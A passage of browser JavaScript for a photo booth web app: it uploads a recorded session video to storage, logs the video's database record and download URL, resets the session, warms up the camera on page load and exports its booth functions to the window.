    if (hasVideoUploadAttempted) return;
    hasVideoUploadAttempted = true;

    if (!videoBlob || !sessionId) {
        logUploadPipeline('Video upload skipped (missing blob or sessionId)', {
            hasVideoBlob: Boolean(videoBlob),
            hasSessionId: Boolean(sessionId)
        });
        return;
    }

    try {
        logUploadPipeline('Video upload started', {
            sizeBytes: videoBlob.size
        });
        const storagePath = `sessions/${sessionId}/video.webm`;
        const downloadUrl = await uploadBlobToStorage(videoBlob, storagePath);

        // Record video upload in database
        await uploadToDatabase(`sessions/${sessionId}/video`, {
            timestamp: new Date().toISOString(),
            downloadUrl: downloadUrl,
            size: videoBlob.size
        });

        logUploadPipeline('Video upload completed', { downloadUrl });
    } catch (error) {
        console.error('[UPLOAD_PIPELINE] Video upload failed:', error);
    }
}

/**
 * Cleans up resources and finishes the photo booth session
 */
function finishAndReset() {
    stopClipCapturePipeline();
    stopAuxCapturePipeline();
    location.reload();
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', warmupCameraInBackgroundOnLoad, { once: true });
} else {
    warmupCameraInBackgroundOnLoad();
}

// ============================================================================
// EXPORT FUNCTIONS TO WINDOW
// ============================================================================
window.showPhotoBoothButton = showPhotoBoothButton;
window.startPhotoBooth = startPhotoBooth;
window.captureImage = captureImage;
window.showHypnosisPage = showHypnosisPage;
window.downloadAll = downloadAll;
window.finishAndReset = finishAndReset;

